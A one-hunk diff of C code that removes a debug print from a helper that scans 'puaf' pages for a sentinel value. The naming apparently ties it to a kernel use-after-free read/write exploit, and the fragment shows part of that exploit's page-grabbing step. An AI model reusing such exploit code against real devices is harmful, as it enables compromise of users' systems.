@@ -114,7 +114,6 @@ void krkw_helper_grab_free_pages(struct kfd* kfd) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
-                    print_u64(grabbed_free_pages);
                     return;
                 }
             }
